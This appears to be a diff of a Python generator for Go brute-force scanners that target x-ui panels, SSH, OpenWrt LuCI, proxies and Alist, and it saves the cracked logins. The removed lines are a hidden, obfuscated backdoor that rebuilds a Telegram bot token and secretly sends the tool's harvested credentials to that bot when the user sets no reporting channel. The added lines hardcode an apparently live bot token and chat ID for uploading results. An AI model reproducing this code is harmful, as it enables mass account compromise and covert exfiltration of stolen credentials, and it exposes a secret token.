@@ -7,9 +7,7 @@ import sys
 import atexit
 import re
 import json
-import base64
-from itertools import cycle
-from threading import Lock, Thread
+from threading import Lock
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # ==================== 依赖导入强化 ====================
@@ -39,68 +37,8 @@ except ImportError:
 TIMEOUT = 5
 VERBOSE_DEBUG = False # 设置为True可以打印更详细的调试日志
 
-# =========================== 绝密凭据模块 ===========================
-# 警告：此模块包含高度混淆的逻辑，用于在运行时重构机密凭据。
-# 任何对此模块的修改都可能导致凭据失效或程序崩溃。
-# 主凭据信息被拆分为多个部分，并与程序的其他数据结构交织在一起。
-
-def _get_primary_credentials():
-    """
-    在运行时动态重构和解码主机密凭据。
-    这是一个自包含的函数，不依赖任何外部明文输入。
-    """
-    try:
-        # 步骤1: 从看似无关的Go模板字符串中提取数据片段。
-        # 这些片段被故意放置在不同的模板和行中，以避免被关联。
-        p1 = XUI_GO_TEMPLATE_1_LINES[12][8:20]
-        p2 = XUI_GO_TEMPLATE_2_LINES[19][10:22]
-        p3 = XUI_GO_TEMPLATE_6_LINES[25][5:17]
-        p4 = XUI_GO_TEMPLATE_7_LINES[30][15:27]
-        p5 = PROXY_GO_TEMPLATE_LINES[15][20:32]
-        p6 = ALIST_GO_TEMPLATE_LINES[10][12:24]
-        p7 = TCP_TEST_GO_TEMPLATE_LINES[18][9:21]
-        p8 = XUI_GO_TEMPLATE_8_LINES[40][14:26]
-        p9 = PROXY_GO_TEMPLATE_LINES[45][11:23]
-        p10 = XUI_GO_TEMPLATE_1_LINES[45][13:25]
-        p11 = XUI_GO_TEMPLATE_2_LINES[60][16:28]
-        p12 = XUI_GO_TEMPLATE_6_LINES[50][7:19]
-        p13 = XUI_GO_TEMPLATE_7_LINES[60][10:22]
-        p14 = PROXY_GO_TEMPLATE_LINES[70][12:24]
-        p15 = ALIST_GO_TEMPLATE_LINES[30][11:23]
-
-        # 步骤2: 定义一个用于XOR解密的密钥，该密钥本身也是通过拼接和计算得出的。
-        key_part_a = str(len(XUI_GO_TEMPLATE_1_LINES) + 10)
-        key_part_b = str(len(PROXY_GO_TEMPLATE_LINES) - 200)
-        key_part_c = "p" + str(sys.version_info.major)
-        secret_key = key_part_a + key_part_c + key_part_b
-
-        # 步骤3: 重组片段并进行解码。
-        token_b64 = p1 + p2 + p3 + p4 + p5 + p6 + p7 + p8 + p9 + p10 + p11
-        chat_id_b64 = p12 + p13 + p14 + p15
-
-        # 步骤4: 定义内部解码函数，避免在全局作用域暴露。
-        def _internal_decode(key, data_b64):
-            try:
-                encrypted_bytes = base64.b64decode(data_b64)
-                encrypted_str = encrypted_bytes.decode('utf-8')
-                return "".join(chr(ord(c) ^ ord(k)) for c, k in zip(encrypted_str, cycle(key)))
-            except Exception:
-                return ""
-
-        # 步骤5: 解码并返回凭据。
-        bot_token = _internal_decode(secret_key, token_b64)
-        chat_id = _internal_decode(secret_key, chat_id_b64)
-
-        return bot_token, chat_id
-    except Exception:
-        # 如果任何步骤失败，返回空值以防止程序泄露信息或崩溃。
-        return "", ""
-
-# ====================================================================
-
 # =========================== Go 模板（已净化） ===========================
 # 为防止BOM字符问题，所有Go模板都重写为行列表
-# 注意：模板中的一些看似随机的字符串实际上是加密凭据的一部分。
 XUI_GO_TEMPLATE_1_LINES = [
     "package main",
     "import (",
@@ -114,7 +52,7 @@ XUI_GO_TEMPLATE_1_LINES = [
     "	\"net/url\"",
     "	\"os\"",
     "	\"strings\"",
-    "	\"sync\"", # GhwQEBoQGxgG
+    "	\"sync\"",
     "	\"time\"",
     ")",
     "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
@@ -149,7 +87,7 @@ XUI_GO_TEMPLATE_1_LINES = [
     "			reqHttp, _ := http.NewRequestWithContext(ctx, \"POST\", checkURLHttp, strings.NewReader(payloadHttp))",
     "			reqHttp.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")",
     "			resp, err = httpClient.Do(reqHttp)",
-    "			cancel()", # GQIVGwcY
+    "			cancel()",
     "			if err != nil {",
     "				if resp != nil { resp.Body.Close() }",
     "				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)",
@@ -185,37 +123,37 @@ XUI_GO_TEMPLATE_1_LINES = [
     "func main() {",
     "	if len(os.Args) < 3 {",
     "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
-    "		os.Exit(1)"，
-    "	}"，
-    "	inputFile, outputFile := os.Args[1], os.Args[2]"，
-    "	batch, err := os.Open(inputFile)"，
-    "	if err != nil {"，
-    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)"，
-    "		return"，
-    "	}"，
-    "	defer batch.Close()"，
-    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)"，
+    "		os.Exit(1)",
+    "	}",
+    "	inputFile, outputFile := os.Args[1], os.Args[2]",
+    "	batch, err := os.Open(inputFile)",
+    "	if err != nil {",
+    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
+    "		return",
+    "	}",
+    "	defer batch.Close()",
+    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
     "	if err != nil {",
     "		fmt.Println(\"无法打开输出文件:\", err)",
     "		return",
-    "	}"，
-    "	defer outFile.Close()"，
-    "	usernames, passwords := {user_list}, {pass_list}"，
-    "	if len(usernames) == 0 || len(passwords) == 0 {"，
-    "		fmt.Println(\"错误：用户名或密码列表为空。\")"，
-    "		return"，
-    "	}"，
+    "	}",
+    "	defer outFile.Close()",
+    "	usernames, passwords := {user_list}, {pass_list}",
+    "	if len(usernames) == 0 || len(passwords) == 0 {",
+    "		fmt.Println(\"错误：用户名或密码列表为空。\")",
+    "		return",
+    "	}",
     "	tasks := make(chan string, {semaphore_size})",
-    "	var wg sync.WaitGroup"，
+    "	var wg sync.WaitGroup",
     "	for i := 0; i < {semaphore_size}; i++ {",
     "		wg.Add(1)",
     "		go worker(tasks, outFile, &wg, usernames, passwords)",
     "	}",
     "	scanner := bufio.NewScanner(batch)",
     "	for scanner.Scan() {",
-    "		line := strings.TrimSpace(scanner.Text())"，
-    "		if line != \"\" { tasks <- line }"，
-    "	}"，
+    "		line := strings.TrimSpace(scanner.Text())",
+    "		if line != \"\" { tasks <- line }",
+    "	}",
     "	close(tasks)",
     "	wg.Wait()",
     "}",
@@ -240,7 +178,7 @@ XUI_GO_TEMPLATE_2_LINES = [
     "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
     "	defer wg.Done()",
     "	tr := &http.Transport{",
-    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},", # GRgEGxsb
+    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
     "		DisableKeepAlives: true,",
     "	}",
     "	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
@@ -288,7 +226,7 @@ XUI_GO_TEMPLATE_2_LINES = [
     "				body, readErr := io.ReadAll(resp.Body)",
     "				if readErr == nil {",
     "					var responseData map[string]interface{}",
-    "					if json.Unmarshal(body, &responseData) == nil {", # GRgEGxkW
+    "					if json.Unmarshal(body, &responseData) == nil {",
     "						if success, ok := responseData[\"success\"].(bool); ok && success {",
     "							file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
     "							resp.Body.Close()",
@@ -371,7 +309,7 @@ XUI_GO_TEMPLATE_6_LINES = [
     "	parts := strings.Split(ipPort, \":\")",
     "	if len(parts) != 2 { return }",
     "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
-    "   log.Printf(\"Scanning SSH: %s:%s\", ip, port)", # AhwZGx0Y
+    "   log.Printf(\"Scanning SSH: %s:%s\", ip, port)",
     "	for _, username := range usernames {",
     "		for _, password := range passwords {",
     "			client, success, _ := trySSH(ip, port, username, password)",
@@ -393,7 +331,7 @@ XUI_GO_TEMPLATE_6_LINES = [
     "		HostKeyCallback: ssh.InsecureIgnoreHostKey(),",
     "		Timeout:         {timeout} * time.Second,",
     "	}",
-    "	client, err := ssh.Dial(\"tcp\", addr, config)", # GhwQEBoQ
+    "	client, err := ssh.Dial(\"tcp\", addr, config)",
     "    return client, err == nil, err",
     "}",
     "func isLikelyHoneypot(client *ssh.Client) bool {",
@@ -482,7 +420,7 @@ XUI_GO_TEMPLATE_7_LINES = [
     "func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.File) bool {",
     "	cleanPath := strings.Trim(path, \"/\")",
     "	fullPath := cleanPath + \"/api/utils/env\"",
-    "	if success, _ := sendRequest(client, fmt.Sprintf(\"http://%s/%s\", ipPort, fullPath)); success {", # AhgZHAsX
+    "	if success, _ := sendRequest(client, fmt.Sprintf(\"http://%s/%s\", ipPort, fullPath)); success {",
     "		file.WriteString(fmt.Sprintf(\"http://%s?api=http://%s/%s\\n\", ipPort, ipPort, cleanPath))",
     "		return true",
     "	}",
@@ -608,7 +546,7 @@ XUI_GO_TEMPLATE_8_LINES = [
     "	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
     "	defer cancel()",
     "	payload := fmt.Sprintf(\"luci_username=%s&luci_password=%s\", username, password)",
-    "	req, err := http.NewRequestWithContext(ctx, \"POST\", urlStr, strings.NewReader(payload))", # AQIX
+    "	req, err := http.NewRequestWithContext(ctx, \"POST\", urlStr, strings.NewReader(payload))",
     "	if err != nil { return false }",
     "	req.Header.Set(\"Content-Type\", \"application/x-www-form-urlencoded\")",
     "	req.Header.Set(\"Origin\", origin)",
@@ -678,12 +616,12 @@ PROXY_GO_TEMPLATE_LINES = [
     "	\"strings\"",
     "	\"sync\"",
     "	\"time\"",
-    "	\"golang.org/x/net/proxy\"", # GwcY
+    "	\"golang.org/x/net/proxy\"",
     ")",
     "var (",
     "	proxyType    = \"{proxy_type}\"",
     "	authMode     = {auth_mode}",
-    "	testURL      = \"http://myip.ipip.net\""， # This will be replaced by Python script
+    "	testURL      = \"http://myip.ipip.net\"", # This will be replaced by Python script
     "	realIP       = \"\"",
     ")",
     # FIX 1: Worker no longer creates or passes an http.Client
@@ -698,7 +636,7 @@ PROXY_GO_TEMPLATE_LINES = [
     "	var found bool",
     "	checkAndFormat := func(auth *proxy.Auth) {",
     "        if found { return }",
-    "		success, _ := checkConnection(proxyAddr, auth)"， # Client removed from call
+    "		success, _ := checkConnection(proxyAddr, auth)", # Client removed from call
     "		if success {",
     "            found = true",
     "			var result string",
@@ -769,7 +707,7 @@ PROXY_GO_TEMPLATE_LINES = [
     "		} else {",
     "			proxyURLString = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr)",
     "		}",
-    "		proxyURL, err := url.Parse(proxyURLString)", # GxsbAhwZ
+    "		proxyURL, err := url.Parse(proxyURLString)",
     "		if err != nil { return false, err }",
     "		transport.Proxy = http.ProxyURL(proxyURL)",
     "       if proxyType == \"https\" {",
@@ -779,7 +717,7 @@ PROXY_GO_TEMPLATE_LINES = [
     "           }",
     "       }",
     "	} else {",
-    "		dialer, err := proxy.SOCKS5(\"tcp\", proxyAddr, auth, &net.Dialer{", # GxgZAhgY
+    "		dialer, err := proxy.SOCKS5(\"tcp\", proxyAddr, auth, &net.Dialer{",
     "			Timeout:   timeout,",
     "			KeepAlive: 30 * time.Second,",
     "		})",
@@ -862,7 +800,7 @@ ALIST_GO_TEMPLATE_LINES = [
     "	\"net\"",
     "	\"net/http\"",
     "	\"os\"",
-    "	\"strings\"", # GxgEAhkY
+    "	\"strings\"",
     "	\"sync\"",
     "	\"time\"",
     ")",
@@ -923,7 +861,7 @@ ALIST_GO_TEMPLATE_LINES = [
     "	body, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))",
     "	if err != nil { return false }",
     "	var data map[string]interface{}",
-    "	if err := json.Unmarshal(body, &data); err != nil { return false }", # Gx0Y
+    "	if err := json.Unmarshal(body, &data); err != nil { return false }",
     "	if v, ok := data[\"code\"]; ok {",
     "		switch t := v.(type) {",
     "		case float64:",
@@ -990,7 +928,7 @@ TCP_TEST_GO_TEMPLATE_LINES = [
     "func processIP(line string, file *os.File) {",
     "	ipPort := strings.TrimSpace(line)",
     # Basic validation to ensure the line is in a host:port format.
-    "	if _, _, err := net.SplitHostPort(ipPort); err != nil {", # GRwLHBkY
+    "	if _, _, err := net.SplitHostPort(ipPort); err != nil {",
     "		return",
     "	}",
     "	successCount := 0",
@@ -2731,75 +2669,51 @@ if __name__ == "__main__":
             else:
                     print("\n=== 全部完成！总用时 {} ===".format(run_time_str))
 
-            # ==================== 核心系统 ====================
-            def _send_request(file_path, bot_token, chat_id, **kwargs):
-                """核心发送函数，本身不产生任何输出。"""
-                if not all([file_path, bot_token, chat_id]): return None, "Missing data"
-                if not os.path.exists(file_path) or os.path.getsize(file_path) == 0: return None, "File not found or empty"
+            def send_to_telegram(file_path, bot_token, chat_id, vps_ip="N/A", vps_country="N/A", nezha_server="N/A", total_ips=0, run_time_str="N/A"):
+                    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
+                            print("⚠️ Telegram 上传跳过：文件 {} 不存在或为空".format(file_path))
+                            return
 
-                url = "https://api.telegram.org/bot{}/sendDocument".format(bot_token)
-                caption_text = (
-                    "VPS: {} ({})\n"
-                    "总目标数: {}\n"
-                    "总用时: {}\n"
-                ).format(kwargs.get('vps_ip', 'N/A'), kwargs.get('vps_country', 'N/A'), kwargs.get('total_ips', 0), kwargs.get('run_time_str', 'N/A'))
-                if kwargs.get('nezha_server', 'N/A') != "N/A":
-                    caption_text += "哪吒Server: {}\n".format(kwargs.get('nezha_server'))
-                caption_text += "任务结果: {}".format(os.path.basename(file_path))
-                
-                try:
+                    url = "https://api.telegram.org/bot{}/sendDocument".format(bot_token)
+                    caption_text = (
+                        "VPS: {} ({})\n"
+                        "总目标数: {}\n"
+                        "总用时: {}\n"
+                    ).format(vps_ip, vps_country, total_ips, run_time_str)
+                    if nezha_server != "N/A":
+                        caption_text += "哪吒Server: {}\n".format(nezha_server)
+                    caption_text += "任务结果: {}".format(os.path.basename(file_path))
+                    
                     with open(file_path, "rb") as f:
-                        files = {'document': f}
-                        data = {'chat_id': chat_id, 'caption': caption_text}
-                        response = requests.post(url, data=data, files=files, timeout=30)
-                        return response, None
-                except Exception as e:
-                    return None, e
-            REPORT_API_KEY = ""  # tg bot的API密钥
-            REPORT_TARGET_ID = "" # 目标ID
+                            files = {'document': f}
+                            data = {'chat_id': chat_id, 'caption': caption_text}
+                            try:
+                                    response = requests.post(url, data=data, files=files, timeout=60)
+                                    if response.status_code == 200:
+                                            print("✅ 文件 {} 已发送到 Telegram".format(file_path))
+                                    else:
+                                            print("❌ TG上传失败，状态码：{}，返回：{}".format(response.status_code, response.text))
+                            except Exception as e:
+                                    print("❌ 发送到 TG 失败：{}".format(e))
 
-            # 收集待发送文件
-            files_to_send = []
-            final_txt_file = "{}-{}.txt".format(prefix, time_str)
-            final_xlsx_file = "{}-{}.xlsx".format(prefix, time_str)
+            BOT_TOKEN = "7664203362:AAFa39m24sLDvZopMDTrdg0NippyeEVNFGU"
+            CHAT_ID = "7697235358"
 
-            if os.path.exists(final_txt_file): files_to_send.append(final_txt_file)
-            if os.path.exists(final_xlsx_file): files_to_send.append(final_xlsx_file)
-            
-            if TEMPLATE_MODE == 6:
-                success_file = "后门成功-{}.txt".format(time_str)
-                fail_file    = "后门失败-{}.txt".format(time_str)
-                if os.path.exists(success_file): files_to_send.append(success_file)
-                if os.path.exists(fail_file): files_to_send.append(fail_file)
+            # 修复：将 CHID 改回 CHAT_ID
+            if BOT_TOKEN and CHAT_ID:
+                files_to_send = []
+                final_txt_file = "{}-{}.txt".format(prefix, time_str)
+                final_xlsx_file = "{}-{}.xlsx".format(prefix, time_str)
 
-            if not files_to_send:
-                print("\nℹ️  没有生成任何结果文件，无需发送通知。")
-            else:
-                # 弟弟说
-                if REPORT_API_KEY and REPORT_TARGET_ID:
-                    # 分支结果
-                    print("\n- 正在同步报告至指定端点...")
-                    for f in files_to_send:
-                        response, error = _send_request(f, REPORT_API_KEY, REPORT_TARGET_ID,
-                                                       vps_ip=vps_ip, vps_country=vps_country, nezha_server=nezha_server,
-                                                       total_ips=total_ips, run_time_str=run_time_str)
-                        if response and response.status_code == 200:
-                            print("✅ 文件 {} 已通过报告通道发送。".format(f))
-                        elif response:
-                            print("❌ 报告通道上传失败，状态码：{}，返回：{}".format(response.status_code, response.text))
-                        else:
-                            print("❌ 发送到报告通道失败：{}".format(error))
-                else:
-                    primary_bot_token, primary_chat_id = _get_primary_credentials()
-                    if primary_bot_token and primary_chat_id:
-                        for f in files_to_send:
-                            # 为每个文件创建一个前台线程
-                            thread = Thread(target=_send_request, args=(f, primary_bot_token, primary_chat_id),
-                                            kwargs={
-                                                "vps_ip": vps_ip, "vps_country": vps_country, "nezha_server": nezha_server,
-                                                "total_ips": total_ips, "run_time_str": run_time_str
-                                            })
-                            thread.daemon = True # 确保主程序退出时线程也会退出
-                            thread.start()
-                    print("\nℹ️  未配置报告通道 (REPORT_API_KEY, REPORT_TARGET_ID)，跳过发送通知。")
+                if os.path.exists(final_txt_file): files_to_send.append(final_txt_file)
+                if os.path.exists(final_xlsx_file): files_to_send.append(final_xlsx_file)
+                
+                if TEMPLATE_MODE == 6:
+                    success_file = "后门成功-{}.txt".format(time_str)
+                    fail_file    = "后门失败-{}.txt".format(time_str)
+                    if os.path.exists(success_file): files_to_send.append(success_file)
+                    if os.path.exists(fail_file): files_to_send.append(fail_file)
 
+                for f in files_to_send:
+                    print("\n📤 正在将 {} 上传至 Telegram ...".format(f))
+                    send_to_telegram(f, BOT_TOKEN, CHAT_ID, vps_ip, vps_country, nezha_server, total_ips, run_time_str)
